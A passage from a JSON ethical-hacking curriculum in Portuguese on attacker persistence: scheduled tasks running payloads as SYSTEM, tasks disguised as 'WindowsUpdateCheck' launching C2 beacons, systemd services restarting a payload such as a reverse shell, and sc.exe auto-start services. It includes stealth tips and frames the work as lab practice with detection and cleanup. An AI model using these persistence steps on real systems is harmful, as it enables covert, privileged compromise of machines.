                                    "Explore a árvore de pastas no painel esquerdo: Task Scheduler Library.",
                                    "Examine as pastas principais como Microsoft > Windows.",
                                    "Clique em uma tarefa para visualizar detalhes no painel central."
                                  ],
                                  "verification": "A janela do Task Scheduler abre mostrando a biblioteca de tarefas sem erros.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Computador Windows com permissões de administrador, acesso à internet para documentação opcional.",
                                  "tips": "Execute como administrador se tarefas não carregarem completamente.",
                                  "learningObjective": "Dominar o acesso inicial à GUI do Task Scheduler para navegação básica.",
                                  "commonMistakes": "Digitar errado o comando (ex: taskschd.msc); não rodar como admin levando a tarefas ocultas."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar e Visualizar Tarefas na GUI",
                                  "subSteps": [
                                    "Navegue pela Task Scheduler Library e subpastas.",
                                    "Selecione uma tarefa e revise abas: General, Triggers, Actions, Conditions, Settings.",
                                    "Identifique colunas como Status, Next Run Time, Last Run Time na lista central.",
                                    "Habilite filtro para mostrar apenas tarefas ativas ou desabilitadas.",
                                    "Exporte uma tarefa para XML para análise offline."
                                  ],
                                  "verification": "Pode listar e descrever detalhes de pelo menos 5 tarefas nativas do Windows.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Mesmos do Step 1; bloco de notas para anotações.",
                                  "tips": "Use Ctrl + F para buscar tarefas por nome na lista.",
                                  "learningObjective": "Entender a estrutura e metadados das tarefas via interface visual.",
                                  "commonMistakes": "Ignorar abas Triggers/Actions, focando só em nomes; não notar tarefas em pastas ocultas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Acessar e Listar Tarefas via Linha de Comando com schtasks.exe",
                                  "subSteps": [
                                    "Abra o Prompt de Comando como administrador.",
                                    "Execute 'schtasks /query /fo LIST /v' para listar todas as tarefas em formato detalhado.",
                                    "Filtre com '/tn nome_tarefa' para detalhes específicos.",
                                    "Use '/query /tn \\Microsoft\\Windows\\Defrag\\ScheduledDefrag' para tarefas em pastas.",
                                    "Redirecione saída para arquivo: 'schtasks /query /fo LIST /v > tarefas.txt'."
                                  ],
                                  "verification": "Comando lista tarefas com colunas como TaskName, Next Run Time, Status sem erros de permissão.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Prompt de Comando (cmd.exe) como admin; editor de texto.",
                                  "tips": "Use /fo TABLE para visualização tabular mais legível.",
                                  "learningObjective": "Executar consultas CLI para enumerar tarefas de forma scriptável.",
                                  "commonMistakes": "Não usar /v para detalhes verbosos; esquecer aspas em nomes com espaços."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar e Entender Triggers Comuns nas Tarefas",
                                  "subSteps": [
                                    "Na GUI ou CLI, localize triggers em tarefas existentes.",
                                    "Identifique 'At log on' (executa no login do usuário).",
                                    "Encontre 'At startup' (inicia com o sistema).",
                                    "Analise 'Monthly' (executa em datas específicas mensais).",
                                    "Compare triggers entre tarefas nativas e crie uma tabela de resumo."
                                  ],
                                  "verification": "Explique diferenças entre 3 triggers com exemplos de tarefas reais.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Task Scheduler aberto; planilha ou documento para tabela.",
                                  "tips": "Procure tarefas como 'GoogleUpdateTaskMachineCore' para exemplos reais de triggers.",
                                  "learningObjective": "Reconhecer padrões de triggers usados em persistência maliciosa.",
                                  "commonMistakes": "Confundir triggers com actions; ignorar herança de pastas raiz."
                                }
                              ],
                              "practicalExample": "Em um lab de ethical hacking, use schtasks /query /fo LIST /v para detectar uma tarefa maliciosa agendada 'At log on' executando payload em C:\\temp\\malware.exe, simulando detecção de persistência em um cenário de pivoting pós-comprometimento.",
                              "finalVerifications": [
                                "Lista completa de tarefas via GUI e CLI sem erros.",
                                "Identifica corretamente triggers em 5+ tarefas nativas.",
                                "Explica diferenças entre At log on, At startup e Monthly.",
                                "Exporta e analisa uma tarefa em XML.",
                                "Detecta anomalias como tarefas em pastas não padrão."
                              ],
                              "assessmentCriteria": [
                                "Precisão na execução de comandos schtasks (100% sem erros sintáticos).",
                                "Compreensão demonstrada de triggers via explicação verbal/escrita.",
                                "Navegação fluida na GUI cobrindo todas as abas principais.",
                                "Identificação de pelo menos 3 tarefas com triggers específicos.",
                                "Análise de saída CLI com filtros e redirecionamento."
                              ],
                              "crossCurricularConnections": [
                                "Integração com PowerShell: Get-ScheduledTask para automação avançada.",
                                "Segurança: Ligação com detecção de malware (ex: MITRE ATT&CK T1053).",
                                "Administração de Sistemas: Gerenciamento de serviços via sc.exe.",
                                "Scripting: Parsing de saídas schtasks em batch/PowerShell."
                              ],
                              "realWorldApplication": "Profissionais de cibersegurança usam essas habilidades para investigar persistência de malware em incidentes reais, como auditorias de endpoints ou análises forenses, detectando tarefas agendadas que reiniciam backdoors após reinicializações."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.5.2.2",
                            "name": "Criar tarefa agendada para payload persistente",
                            "description": "Usar schtasks /create /tn \"TarefaMaliciosa\" /tr \"C:\\temp\\payload.exe\" /sc onlogon /ru SYSTEM para criar tarefa que roda como SYSTEM no login, com argumentos ocultos e privilégios elevados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Teste Seguro",
                                  "subSteps": [
                                    "Inicie uma máquina virtual (VM) Windows isolada, como Windows 10 ou Server, sem rede externa.",
                                    "Crie um payload de teste inofensivo (ex: um script batch que cria um arquivo log.txt).",
                                    "Salve o payload como 'C:\\temp\\payload.exe' ou equivalente batch/script.",
                                    "Abra o Prompt de Comando como Administrador.",
                                    "Verifique privilégios elevados com 'whoami /priv'."
                                  ],
                                  "verification": "VM rodando isolada, payload presente em C:\\temp\\, Prompt como Admin confirmado.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Máquina Virtual Windows (VirtualBox/VMware)",
                                    "Payload de teste inofensivo (ex: echo 'Teste' > C:\\log.txt > payload.bat)"
                                  ],
                                  "tips": "Sempre use payloads dummy para evitar riscos; isole a VM com snapshot para rollback rápido.",
                                  "learningObjective": "Compreender a importância de ambientes controlados para simulações éticas de hacking.",
                                  "commonMistakes": [
                                    "Executar em máquina host real",
                                    "Usar payloads maliciosos reais",
                                    "Esquecer privilégios de Admin"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar Sintaxe e Parâmetros do Comando schtasks /create",
                                  "subSteps": [
                                    "Pesquise 'schtasks /create /?' para ver ajuda oficial.",
                                    "Analise parâmetros chave: /tn (nome tarefa), /tr (caminho executável), /sc onlogon (gatilho login), /ru SYSTEM (usuário).",
                                    "Estude opções ocultas: /f (forçar criação), argumentos extras no /tr para stealth.",
                                    "Teste comando seco: schtasks /create /tn \"Test\" /tr \"notepad.exe\" /sc once /st 00:00 sem executar.",
                                    "Anote impactos de privilégios elevados e persistência."
                                  ],
                                  "verification": "Lista correta de parâmetros anotada e comando seco executado sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Documentação Microsoft schtasks",
                                    "Prompt de Comando como Admin"
                                  ],
                                  "tips": "Use aspas duplas em nomes com espaços; /ru SYSTEM ignora senha para elevação.",
                                  "learningObjective": "Dominar parâmetros para criar tarefas persistentes com privilégios elevados.",
                                  "commonMistakes": [
                                    "Confundir /sc onlogon com /sc daily",
                                    "Esquecer /f para overwrite",
                                    "Não usar SYSTEM para bypass UAC"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir e Executar o Comando de Criação da Tarefa",
                                  "subSteps": [
                                    "Monte o comando: schtasks /create /tn \"TarefaMaliciosa\" /tr \"C:\\temp\\payload.exe arg1 arg2\" /sc onlogon /ru SYSTEM /f.",
                                    "Adicione stealth: argumentos ocultos via /tr com parâmetros codificados ou indiretos.",
                                    "Execute o comando no Prompt Admin.",
                                    "Confirme sem erros (deve retornar 'SUCCESS').",
                                    "Liste tarefas com 'schtasks /query /tn \"TarefaMaliciosa\" /v'."
                                  ],
                                  "verification": "Comando executado com 'SUCCESS', tarefa listada com /query.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Prompt de Comando Admin",
                                    "Payload preparado"
                                  ],
                                  "tips": "Teste argumentos ocultos com payload que loga params; use /rl HIGHEST para níveis extras.",
                                  "learningObjective": "Aplicar sintaxe para criar tarefa persistente com execução como SYSTEM no login.",
                                  "commonMistakes": [
                                    "Erro de sintaxe em /tr com args",
                                    "Falta de /f causando falha",
                                    "Nome tarefa com caracteres inválidos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar Persistência e Realizar Limpeza",
                                  "subSteps": [
                                    "Reinicie a VM e faça login para disparar onlogon.",
                                    "Monitore execução: verifique logs (Event Viewer > Task Scheduler), arquivo criado pelo payload.",
                                    "Confirme execução como SYSTEM via logs ou procmon.",
                                    "Remova tarefa: schtasks /delete /tn \"TarefaMaliciosa\" /f.",
                                    "Restaure snapshot da VM e documente lições."
                                  ],
                                  "verification": "Payload executa no login como SYSTEM, tarefa removida, VM limpa.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Event Viewer",
                                    "Process Monitor (ProcMon)",
                                    "Snapshot VM"
                                  ],
                                  "tips": "Use ProcMon para capturar execuções stealth; sempre limpe após testes.",
                                  "learningObjective": "Validar persistência e práticas de cleanup em simulações éticas.",
                                  "commonMistakes": [
                                    "Não reiniciar para testar",
                                    "Esquecer remoção da tarefa",
                                    "Ignorar logs de detecção"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de Red Team, crie 'schtasks /create /tn \"WindowsUpdateCheck\" /tr \"C:\\temp\\beacon.exe --silent\" /sc onlogon /ru SYSTEM /f' para payload C2 que liga no login, simulando APT persistente detectável por EDR.",
                              "finalVerifications": [
                                "Tarefa criada e listada corretamente com schtasks /query.",
                                "Executa automaticamente no logon como SYSTEM sem interação.",
                                "Argumentos ocultos processados pelo payload.",
                                "Persistência confirmada após reboot via logs ou artefatos.",
                                "Tarefa removida sem resíduos.",
                                "Ambiente restaurado ao estado inicial."
                              ],
                              "assessmentCriteria": [
                                "Comando sintaticamente correto e executado sem erros.",
                                "Uso apropriado de /ru SYSTEM e /sc onlogon para elevação/persistência.",
                                "Verificação completa de execução e stealth.",
                                "Documentação de lições e cleanup ético.",
                                "Ambiente de teste isolado e seguro.",
                                "Compreensão de detecções potenciais (ex: Task Scheduler logs)."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas Windows (Gerenciamento de Tarefas e Serviços).",
                                "Desenvolvimento de Scripts (Batch/PowerShell para automação).",
                                "Análise de Malware (Técnicas de Persistência).",
                                "Defesa Cibernética (Detecção via SIEM/EDR).",
                                "Ética em Hacking (Regras de Engajamento em Pentests)."
                              ],
                              "realWorldApplication": "Red Teams usam isso em operações autorizadas para simular persistência de atacantes avançados, ajudando Blue Teams a aprimorar detecções em ferramentas como Sysmon, EDR e hunting de tarefas suspeitas em incidentes reais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.5.2.3",
                            "name": "Testar execução e remover tarefas de persistência",
                            "description": "Executar tarefa com schtasks /run /tn \"TarefaMaliciosa\", monitorar com Event Viewer (Microsoft-Windows-TaskScheduler/Operational), e deletar com schtasks /delete /tn \"TarefaMaliciosa\" /f.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Executar a Tarefa Agendada de Persistência",
                                  "subSteps": [
                                    "Abra o Prompt de Comando (cmd) como Administrador.",
                                    "Execute o comando: schtasks /run /tn \"TarefaMaliciosa\".",
                                    "Confirme que o comando retorna 'SUCCESS' sem erros.",
                                    "Aguarde alguns segundos para que a tarefa seja processada pelo agendador.",
                                    "Anote o horário exato da execução para correlação posterior."
                                  ],
                                  "verification": "Verifique a saída do comando schtasks, que deve indicar 'SUCCESS'. Confirme no Task Scheduler se o status mudou para 'Ready'.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Máquina virtual Windows 10/11 com privilégios de administrador, tarefa 'TarefaMaliciosa' previamente criada, Prompt de Comando.",
                                  "tips": "Sempre execute o cmd como administrador para evitar erros de permissão. Use aspas duplas no nome da tarefa se contiver espaços.",
                                  "learningObjective": "Compreender como disparar manualmente tarefas agendadas para simular ativação de persistência em cenários de teste.",
                                  "commonMistakes": "Executar sem privilégios de admin (erro de acesso negado); nome da tarefa incorreto (comando falha silenciosamente)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Monitorar a Execução no Visualizador de Eventos",
                                  "subSteps": [
                                    "Pressione Win + R, digite 'eventvwr' e pressione Enter para abrir o Event Viewer.",
                                    "Navegue para: Applications and Services Logs > Microsoft > Windows > TaskScheduler > Operational.",
                                    "Filtre eventos recentes (últimos 15 minutos) usando o filtro rápido ou Action > Filter Current Log.",
                                    "Procure por eventos com ID 100, 200 ou 201 relacionados à 'TarefaMaliciosa'.",
                                    "Analise detalhes como TaskName, ResultCode e horários para confirmar execução."
                                  ],
                                  "verification": "Identifique pelo menos um evento de Task Start (ID 100) ou Task Completed (ID 201) com nome da tarefa e código de resultado 0 (sucesso).",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Event Viewer no Windows, tarefa executada no Step 1.",
                                  "tips": "Ative o log Operational se estiver desabilitado (clique direito > Enable Log). Use Ctrl+F para buscar 'TarefaMaliciosa'.",
                                  "learningObjective": "Aprender a usar o Event Viewer para auditoria de atividades do Task Scheduler em investigações de segurança.",
                                  "commonMistakes": "Não habilitar o log Operational (sem eventos visíveis); filtrar período errado (eventos perdidos)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Verificar Efeitos e Comportamento da Tarefa Executada",
                                  "subSteps": [
                                    "Verifique processos em execução no Gerenciador de Tarefas (Ctrl+Shift+Esc) para payloads da tarefa.",
                                    "Consulte logs adicionais como System ou Security no Event Viewer para impactos colaterais.",
                                    "Execute schtasks /query /tn \"TarefaMaliciosa\" para confirmar status atual.",
                                    "Simule verificação de artefatos (ex: arquivos criados pelo payload da tarefa).",
                                    "Documente quaisquer anomalias observadas."
                                  ],
                                  "verification": "Confirme que a tarefa rodou (status 'Ready'), processos/payloads executados e sem erros persistentes.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Gerenciador de Tarefas, Event Viewer, schtasks ferramenta.",
                                  "tips": "Correlacione horários entre schtasks e Event Viewer. Monitore CPU/RAM para picos suspeitos.",
                                  "learningObjective": "Desenvolver habilidades para validar impactos de persistência e correlacionar evidências múltiplas.",
                                  "commonMistakes": "Ignorar artefatos do payload (foco só em schtasks); não documentar horários (dificulta correlação)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Remover a Tarefa de Persistência",
                                  "subSteps": [
                                    "Abra cmd como Administrador novamente.",
                                    "Execute: schtasks /delete /tn \"TarefaMaliciosa\" /f.",
                                    "Confirme saída 'SUCCESS'.",
                                    "Verifique com schtasks /query /fo LIST | findstr TarefaMaliciosa (deve retornar vazio).",
                                    "Reinicie o Task Scheduler service (services.msc > Task Scheduler > Restart) se necessário."
                                  ],
                                  "verification": "Comando retorna 'SUCCESS' e schtasks /query não lista mais a tarefa.",
                                  "estimatedTime": "5 minutos",
                                  "materials": "Prompt de Comando como admin.",
                                  "tips": "O flag /f força deleção sem prompt. Sempre confirme remoção com /query.",
                                  "learningObjective": "Dominar técnicas de remediação para eliminar mecanismos de persistência em respostas a incidentes.",
                                  "commonMistakes": "Esquecer /f (prompt de confirmação trava); deletar sem privilégios (falha)."
                                }
                              ],
                              "practicalExample": "Em um laboratório de ethical hacking, você criou uma tarefa 'TarefaMaliciosa' que executa um script PowerShell inocuo (ex: cria um arquivo log.txt). Use schtasks /run para dispará-la, monitore no Event Viewer para ver o evento 201 (sucesso), verifique o arquivo criado, e delete com /f para limpeza.",
                              "finalVerifications": [
                                "Comando schtasks /run retorna SUCCESS.",
                                "Event Viewer mostra eventos de execução (IDs 100/201) com resultado 0.",
                                "Efeitos do payload confirmados (ex: arquivo criado ou processo rodado).",
                                "Tarefa removida e não listada em schtasks /query.",
                                "Logs limpos sem recorrências após restart do serviço.",
                                "Documentação completa de horários e evidências."
                              ],
                              "assessmentCriteria": [
                                "Execução precisa dos comandos schtasks sem erros sintáticos.",
                                "Interpretação correta de eventos no Event Viewer.",
                                "Correlação eficaz entre execução, monitoramento e remoção.",
                                "Verificação completa de remoção e ausência de resíduos.",
                                "Documentação clara de passos e observações.",
                                "Tempo total dentro de 40 minutos com eficiência."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas: Gerenciamento de serviços Windows (Task Scheduler).",
                                "Análise Forense Digital: Interpretação de logs do Event Viewer.",
                                "Programação: Scripts Batch/PowerShell para automação de tarefas.",
                                "Redes e Infraestrutura: Persistência em ambientes de domínio Active Directory."
                              ],
                              "realWorldApplication": "Durante resposta a incidentes de segurança (IR), analistas usam essas técnicas para detectar, validar e remover tarefas agendadas maliciosas criadas por malware como Emotet ou Cobalt Strike, prevenindo re-infestações em endpoints corporativos."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.5.3",
                        "name": "Persistência com Serviços do Sistema Operacional",
                        "description": "Implementação de serviços persistentes em Linux (systemd) e Windows para rodar payloads como serviços do SO, iniciando automaticamente no boot com alto privilégio.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.5.3.1",
                            "name": "Criar serviço systemd no Linux",
                            "description": "Criar arquivo /etc/systemd/system/persist.service com [Unit], [Service] (ExecStart=/tmp/payload, Restart=always) e [Install], ativar com systemctl daemon-reload, enable e start.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e entender a estrutura de um unit file systemd",
                                  "subSteps": [
                                    "Verifique privilégios de root/sudo com 'sudo -l' ou 'whoami'.",
                                    "Navegue para o diretório /etc/systemd/system/ usando 'cd /etc/systemd/system/'.",
                                    "Crie um arquivo vazio chamado persist.service com 'sudo nano persist.service' ou 'sudo vim persist.service'.",
                                    "Adicione comentários iniciais explicando o propósito (ex: # Serviço de persistência para ethical hacking).",
                                    "Pesquise rapidamente a sintaxe básica de unit files com 'man systemd.service'."
                                  ],
                                  "verification": "Arquivo persist.service criado em /etc/systemd/system/ e pode ser aberto sem erros.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Máquina Linux com systemd (ex: Ubuntu 20.04+)",
                                    "Editor de texto (nano/vim)",
                                    "Acesso root/sudo"
                                  ],
                                  "tips": [
                                    "Sempre use sudo para editar arquivos em /etc/. Faça um backup com 'sudo cp persist.service persist.service.bak'."
                                  ],
                                  "learningObjective": "Compreender os pré-requisitos e estrutura básica de arquivos de serviço systemd.",
                                  "commonMistakes": [
                                    "Esquecer sudo e receber 'Permission denied'",
                                    "Criar arquivo no diretório errado (ex: home)",
                                    "Ignorar sintaxe de comentários"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar a seção [Unit] no arquivo de serviço",
                                  "subSteps": [
                                    "Adicione '[Unit]' na primeira linha.",
                                    "Inclua 'Description=Persistência de Payload para Testes de Segurança'.",
                                    "Adicione 'After=network.target' para garantir que o serviço inicie após a rede.",
                                    "Adicione 'Wants=network-online.target' para dependência de rede online.",
                                    "Salve temporariamente e verifique sintaxe com 'systemd-analyze verify persist.service'."
                                  ],
                                  "verification": "Seção [Unit] completa e 'systemd-analyze verify' não reporta erros.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Arquivo persist.service aberto",
                                    "Comando systemd-analyze"
                                  ],
                                  "tips": [
                                    "Use Description descritiva para facilitar troubleshooting. Evite quebras de linha desnecessárias."
                                  ],
                                  "learningObjective": "Dominar a configuração de metadados e dependências do serviço.",
                                  "commonMistakes": [
                                    "Ortografia errada em 'After=' causando falhas de dependência",
                                    "Falta de aspas em valores com espaços",
                                    "Seção duplicada"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar a seção [Service] com ExecStart e Restart",
                                  "subSteps": [
                                    "Adicione '[Service]' após [Unit].",
                                    "Defina 'Type=simple' para serviço simples.",
                                    "Adicione 'ExecStart=/tmp/payload' (crie /tmp/payload como echo 'Payload executado' se não existir).",
                                    "Inclua 'Restart=always' para reinicialização automática em falhas.",
                                    "Adicione 'User=root' e 'WorkingDirectory=/tmp' para contexto de execução.",
                                    "Teste sintaxe novamente com 'systemd-analyze verify persist.service'."
                                  ],
                                  "verification": "Seção [Service] salva e verificada sem erros de sintaxe.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Script de teste em /tmp/payload (ex: #!/bin/bash\necho 'Persistindo...' > /tmp/persist.log) com chmod +x"
                                  ],
                                  "tips": [
                                    "Torne ExecStart absoluto e executável. Use RestartSec=10 para delay em restarts."
                                  ],
                                  "learningObjective": "Configurar execução e políticas de reinicialização do serviço.",
                                  "commonMistakes": [
                                    "Caminho relativo em ExecStart",
                                    "Falta de permissões em /tmp/payload",
                                    "Type=oneshot em vez de simple"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Adicionar seção [Install] e finalizar o arquivo",
                                  "subSteps": [
                                    "Adicione '[Install]' no final do arquivo.",
                                    "Inclua 'WantedBy=multi-user.target' para inicialização em multi-user mode.",
                                    "Salve o arquivo permanentemente com Ctrl+O (nano) ou :wq (vim).",
                                    "Valide o arquivo completo com 'systemd-analyze verify /etc/systemd/system/persist.service'.",
                                    "Liste serviços com 'ls /etc/systemd/system/ | grep persist' para confirmar."
                                  ],
                                  "verification": "Arquivo completo salvo e listado corretamente no diretório.",
                                  "estimatedTime": "5-10 minutos",
                                  "materials": [
                                    "Editor de texto"
                                  ],
                                  "tips": [
                                    "WantedBy=multi-user.target é padrão para serviços de usuário. Evite graphical.target a menos que necessário."
                                  ],
                                  "learningObjective": "Finalizar configuração para auto-inicialização.",
                                  "commonMistakes": [
                                    "Seção [Install] ausente impedindo enable",
                                    "Target errado como default.target",
                                    "Não salvar mudanças"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Recarregar daemon, habilitar, iniciar e verificar o serviço",
                                  "subSteps": [
                                    "Execute 'sudo systemctl daemon-reload' para recarregar configurações.",
                                    "Habilite o serviço com 'sudo systemctl enable persist.service'.",
                                    "Inicie com 'sudo systemctl start persist.service'.",
                                    "Verifique status com 'sudo systemctl status persist.service'.",
                                    "Monitore logs com 'sudo journalctl -u persist.service -f' e teste restart com 'sudo systemctl restart persist.service'.",
                                    "Simule reboot com 'sudo reboot' em VM e confirme pós-reboot."
                                  ],
                                  "verification": "'systemctl status persist.service' mostra 'active (running)' e enabled.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Comandos systemctl e journalctl"
                                  ],
                                  "tips": [
                                    "Use --now com enable para enable+start. Monitore com -f para logs em tempo real."
                                  ],
                                  "learningObjective": "Ativar e validar o serviço em produção simulada.",
                                  "commonMistakes": [
                                    "Esquecer daemon-reload causando 'Unit not found'",
                                    "Start antes de enable",
                                    "Ignorar erros em status"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório de ethical hacking, crie 'persist.service' para executar '/tmp/payload' (um script que cria um reverse shell ou loga acessos) a cada boot, simulando persistência pós-exploração em um servidor Linux comprometido, testando detecção por ferramentas como OSSEC ou auditd.",
                              "finalVerifications": [
                                "Arquivo /etc/systemd/system/persist.service existe com todas seções corretas (cat o arquivo).",
                                "'sudo systemctl status persist.service' mostra active (running) sem erros.",
                                "'sudo systemctl is-enabled persist.service' retorna 'enabled'.",
                                "'sudo journalctl -u persist.service' exibe logs de ExecStart bem-sucedidos.",
                                "Após 'sudo systemctl restart persist.service', o serviço reinicia automaticamente devido a Restart=always.",
                                "'sudo systemctl list-unit-files | grep persist' confirma enabled."
                              ],
                              "assessmentCriteria": [
                                "Arquivo de serviço possui [Unit], [Service] e [Install] com configurações exatas (ExecStart, Restart=always).",
                                "daemon-reload, enable e start executados sem erros de sintaxe ou permissão.",
                                "Serviço persiste após restart e boot simulado, comprovado por status e logs.",
                                "Explicação correta de cada seção e comandos usados.",
                                "Identificação e correção de erros comuns como paths incorretos.",
                                "Aplicação em contexto de ethical hacking sem impactos reais."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas Linux (gerenciamento de serviços com systemd)",
                                "Segurança Cibernética (técnicas de persistência em pentests)",
                                "Scripting e Automação (criação de payloads em Bash/Python)",
                                "DevOps e Infraestrutura (deploy de serviços em produção)",
                                "Análise Forense (detecção via journalctl e audit logs)"
                              ],
                              "realWorldApplication": "Em operações de Red Team e ethical hacking, criar serviços systemd permite simular persistência de malware em ambientes Linux de produção, avaliando defesas como monitoramento de mudanças em /etc/systemd/system/, detecção de processos root e políticas de integridade de arquivos (ex: SELinux, AppArmor)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.5.3.2",
                            "name": "Criar serviço no Windows com sc.exe",
                            "description": "Usar sc create PersistService binPath= \"C:\\temp\\payload.exe\" type= own start= auto para registrar serviço auto-start, configurá-lo como SYSTEM e testar com sc start PersistService.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e o payload executável",
                                  "subSteps": [
                                    "Configure uma máquina virtual Windows (ex: Windows 10/11) com privilégios administrativos.",
                                    "Crie o diretório C:\\temp se não existir.",
                                    "Desenvolva ou baixe um payload simples (ex: payload.exe que cria um arquivo log.txt com timestamp a cada 60s para simular persistência).",
                                    "Coloque o payload.exe em C:\\temp\\payload.exe e verifique se é executável.",
                                    "Abra o Prompt de Comando como Administrador (clique direito > Executar como administrador)."
                                  ],
                                  "verification": "Confirme que o payload.exe roda manualmente sem erros e que o Prompt está elevado (título mostra 'Administrador').",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Máquina virtual Windows com admin access",
                                    "Compilador ou payload.exe pronto (ex: em C# ou batch compilado)",
                                    "Diretório C:\\temp"
                                  ],
                                  "tips": "Use um payload inofensivo para testes éticos; evite payloads reais em ambientes de produção.",
                                  "learningObjective": "Entender a preparação segura de um executável para persistência simulada.",
                                  "commonMistakes": [
                                    "Não elevar privilégios no Prompt",
                                    "Payload com erros de execução",
                                    "Diretório ou arquivo inexistente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar o serviço usando sc create",
                                  "subSteps": [
                                    "No Prompt de Admin, execute: sc create PersistService binPath= \"C:\\temp\\payload.exe\" type= own start= auto",
                                    "Verifique erros no comando (deve retornar [SC] CreateService SUCCESS).",
                                    "Confirme criação com 'sc query PersistService' (STATE deve ser STOPPED).",
                                    "Abra services.msc e localize 'PersistService' na lista.",
                                    "Anote o SID ou detalhes do serviço para próxima configuração."
                                  ],
                                  "verification": "Comando sc query PersistService retorna informações do serviço sem erros.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Prompt de Comando como Admin",
                                    "Comando sc.exe (nativo do Windows)"
                                  ],
                                  "tips": "Use aspas duplas no binPath se houver espaços; type=own para processo próprio, start=auto para inicialização automática.",
                                  "learningObjective": "Dominar o comando sc create para registrar serviços personalizados com auto-start.",
                                  "commonMistakes": [
                                    "Falta de aspas no binPath",
                                    "Nome de serviço duplicado",
                                    "Executar sem admin"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar permissões para execução como SYSTEM",
                                  "subSteps": [
                                    "Execute: sc sdset PersistService D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)",
                                    "Verifique com 'sc sdshow PersistService' para confirmar ACL atualizada (SY para SYSTEM full control).",
                                    "Ajuste start type se necessário: sc config PersistService start= auto",
                                    "Confirme configurações com 'sc qc PersistService'.",
                                    "Teste permissões simulando logon como SYSTEM (use psexec ou task scheduler)."
                                  ],
                                  "verification": "sc sdshow mostra permissões para SY (SYSTEM) com controle total.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Prompt de Admin",
                                    "Ferramenta psexec.exe opcional para teste SYSTEM"
                                  ],
                                  "tips": "O SD (Security Descriptor) dá full access ao SYSTEM; copie exatamente para evitar erros de sintaxe.",
                                  "learningObjective": "Aprender a modificar ACL de serviços para execução privilegiada como SYSTEM.",
                                  "commonMistakes": [
                                    "Erro de sintaxe no SD string",
                                    "Não verificar sdshow",
                                    "Ignorar BUILTIN\\Administrators"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar inicialização e persistência do serviço",
                                  "subSteps": [
                                    "Inicie o serviço: sc start PersistService (verifique logs de erro com sc query).",
                                    "Monitore execução em Task Manager (procure payload.exe ou processo filho).",
                                    "Simule reboot: shutdown /r /t 0, então após boot, execute sc query PersistService (deve ser RUNNING).",
                                    "Verifique artefatos do payload (ex: log.txt criado).",
                                    "Opcional: Pare e delete com sc stop PersistService e sc delete PersistService."
                                  ],
                                  "verification": "Serviço inicia automaticamente após simulação de reboot e payload produz output esperado.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Task Manager",
                                    "services.msc",
                                    "Arquivo de log do payload"
                                  ],
                                  "tips": "Use VM para testes de reboot; monitore Event Viewer > Windows Logs > System para erros de serviço.",
                                  "learningObjective": "Validar persistência e detecção de serviços em cenários reais de boot.",
                                  "commonMistakes": [
                                    "Serviço falha no start por dependências",
                                    "Não testar após reboot",
